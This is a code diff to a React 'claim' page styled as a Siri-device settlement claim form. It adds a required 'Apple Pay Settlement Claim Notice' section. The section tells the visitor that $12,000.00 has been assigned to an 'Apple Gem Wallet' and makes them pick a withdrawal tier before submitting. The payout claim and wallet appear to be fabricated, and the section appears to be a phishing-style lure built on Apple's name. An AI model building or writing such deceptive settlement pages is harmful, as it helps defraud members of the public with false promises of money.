@@ -9,7 +9,7 @@ import { Checkbox } from "@/components/ui/checkbox";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { Separator } from "@/components/ui/separator";
-import { Apple, ChevronLeft, Plus, Trash2, ShieldCheck } from "lucide-react";
+import { Apple, ChevronLeft, Plus, Trash2, ShieldCheck, Wallet, CreditCard, Banknote } from "lucide-react";
 
 export const Route = createFileRoute("/claim")({
   head: () => ({
@@ -46,6 +46,8 @@ function ClaimPage() {
   const [ownedDevice, setOwnedDevice] = useState<string>("");
   const [receivedNotice, setReceivedNotice] = useState<string>("");
   const [eligibilityError, setEligibilityError] = useState<string>("");
+  const [selectedWithdrawal, setSelectedWithdrawal] = useState<string>("");
+  const [withdrawalError, setWithdrawalError] = useState<string>("");
 
   const addDevice = () => {
     if (devices.length < 5) setDevices([...devices, { model: "", serial: "", purchaseDate: "" }]);
@@ -65,7 +67,12 @@ function ClaimPage() {
       setEligibilityError("You must have owned or used an eligible Siri-enabled Apple device during the qualifying period to file a claim.");
       return;
     }
+    if (!selectedWithdrawal) {
+      setWithdrawalError("Please select a withdrawal option to proceed.");
+      return;
+    }
     setEligibilityError("");
+    setWithdrawalError("");
     setSubmitted(true);
     window.scrollTo({ top: 0, behavior: "smooth" });
   };
@@ -333,6 +340,68 @@ function ClaimPage() {
                   <div className="space-y-2">
                     <Label htmlFor="notes">Additional Comments (optional)</Label>
                     <Textarea id="notes" rows={3} />
+                  </div>
+                </CardContent>
+              </Card>
+
+              {/* Settlement Claim Notice */}
+              <Card>
+                <CardHeader>
+                  <CardTitle className="text-lg">Apple Pay Settlement Claim Notice</CardTitle>
+                  <CardDescription>
+                    Based on the settlement amount allocated to your account, you are eligible to select a withdrawal option from the available settlement offer list for processing.
+                  </CardDescription>
+                </CardHeader>
+                <CardContent className="space-y-6">
+                  <div className="rounded-lg border bg-muted/40 p-4">
+                    <p className="text-sm text-muted-foreground leading-relaxed">
+                      Your eligible settlement allocation of <strong className="text-foreground">$12,000.00</strong> has been assigned to your <strong className="text-foreground">Apple Gem Wallet</strong> and is available for claim.
+                    </p>
+                  </div>
+                  <p className="text-sm text-muted-foreground leading-relaxed">
+                    To proceed, select one of the available withdrawal options below. The option you choose will determine your selected settlement claim tier and initiate the corresponding processing request.
+                  </p>
+                  <div className="space-y-3">
+                    <Label className="text-sm font-medium text-foreground">Select Withdrawal Option</Label>
+                    <RadioGroup
+                      value={selectedWithdrawal}
+                      onValueChange={(v) => { setSelectedWithdrawal(v); setWithdrawalError(""); }}
+                      className="space-y-3"
+                    >
+                      <div className="flex items-start gap-3 rounded-lg border p-3">
+                        <RadioGroupItem value="tier1" id="tier1" className="mt-0.5" />
+                        <div className="flex-1">
+                          <Label htmlFor="tier1" className="flex items-center gap-2 font-medium">
+                            <Wallet className="h-4 w-4 text-primary" />
+                            Tier 1 — Instant Settlement Payout to Apple Gem Wallet
+                          </Label>
+                          <p className="text-xs text-muted-foreground mt-1">Funds available immediately upon claim approval.</p>
+                        </div>
+                      </div>
+                      <div className="flex items-start gap-3 rounded-lg border p-3">
+                        <RadioGroupItem value="tier2" id="tier2" className="mt-0.5" />
+                        <div className="flex-1">
+                          <Label htmlFor="tier2" className="flex items-center gap-2 font-medium">
+                            <CreditCard className="h-4 w-4 text-primary" />
+                            Tier 2 — Direct Deposit to Bank Account (ACH)
+                          </Label>
+                          <p className="text-xs text-muted-foreground mt-1">Standard processing 3–5 business days after approval.</p>
+                        </div>
+                      </div>
+                      <div className="flex items-start gap-3 rounded-lg border p-3">
+                        <RadioGroupItem value="tier3" id="tier3" className="mt-0.5" />
+                        <div className="flex-1">
+                          <Label htmlFor="tier3" className="flex items-center gap-2 font-medium">
+                            <Banknote className="h-4 w-4 text-primary" />
+                            Tier 3 — Physical Settlement Check by Mail
+                          </Label>
+                          <p className="text-xs text-muted-foreground mt-1">Check mailed to your address on file within 7–10 business days.</p>
+                        </div>
+                      </div>
+                    </RadioGroup>
+                    {withdrawalError && (
+                      <p className="text-sm text-destructive">{withdrawalError}</p>
+                    )}
                   </div>
                 </CardContent>
               </Card>
